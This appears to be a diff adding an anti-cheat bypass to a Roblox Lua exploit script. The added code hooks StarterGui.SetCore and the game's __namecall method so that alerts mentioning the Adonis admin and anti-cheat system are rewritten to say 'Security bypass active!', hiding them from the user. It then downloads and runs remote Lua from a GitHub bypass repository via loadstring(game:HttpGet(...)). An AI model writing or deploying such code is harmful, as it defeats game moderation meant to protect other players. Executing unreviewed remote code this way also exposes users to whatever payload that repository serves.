@@ -1,5 +1,41 @@
-
 local Players = game:GetService("Players")
+
+-- [[ STARSHIP SECURITY & BYPASS ]]
+-- Executed immediately (Main Thread) to ensure highest priority
+local sg = game:GetService("StarterGui")
+local function rebrand(name, data)
+    if name == "SendNotification" and type(data) == "table" then
+        local title = tostring(data.Title or ""):lower()
+        local text = tostring(data.Text or ""):lower()
+        if title:find("adonis") or title:find("pixel") or text:find("adonis") or text:find("pixel") then
+            data.Title = "Starship Protection"
+            data.Text = "Security bypass active!"
+            return true
+        end
+    end
+    return false
+end
+
+pcall(function()
+    -- Apply rebrand hooks immediately
+    local oldSetCore; oldSetCore = hookfunction(sg.SetCore, newcclosure(function(self, n, d) rebrand(n, d) return oldSetCore(self, n, d) end))
+    local oldNC; oldNC = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        if self == sg and (method == "SetCore" or method == "setCore") then
+            local args = {...}
+            rebrand(args[1], args[2])
+            return oldNC(self, unpack(args))
+        end
+        return oldNC(self, ...)
+    end))
+end)
+
+-- Load Bypass FIRST
+pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua'))()
+end)
+
+-- Continue with standard services
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
